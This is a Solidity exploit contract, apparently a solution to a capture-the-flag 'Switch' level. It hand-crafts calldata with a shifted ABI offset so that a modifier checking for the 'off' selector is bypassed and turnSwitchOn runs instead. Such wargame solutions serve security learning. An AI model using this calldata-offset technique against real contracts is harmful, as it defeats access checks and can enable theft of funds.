pragma solidity 0.8.19;

contract Exploit {
    constructor(address _target) {
        bytes memory data = new bytes(4 + 32 + 32 + 32 + 32 + 32);
        data[0] = 0x30;
        data[1] = 0xc1;
        data[2] = 0x3a;
        data[3] = 0xde;

        // possition of the data bytes array that will be used by flipSwitch
        data[35] = 0x60;

        // selector expected by onlyOff modifier
        data[68] = 0x20;
        data[69] = 0x60;
        data[70] = 0x6e;
        data[71] = 0x15;

        data[131] = 0x04; // length of the turnSwitchOn selector

        // turnSwitchOn selector
        data[132] = 0x76;
        data[133] = 0x22;
        data[134] = 0x7e;
        data[135] = 0x12;
        
        (bool success,) = _target.call(data);
        require(success, "call failed");
    }
}
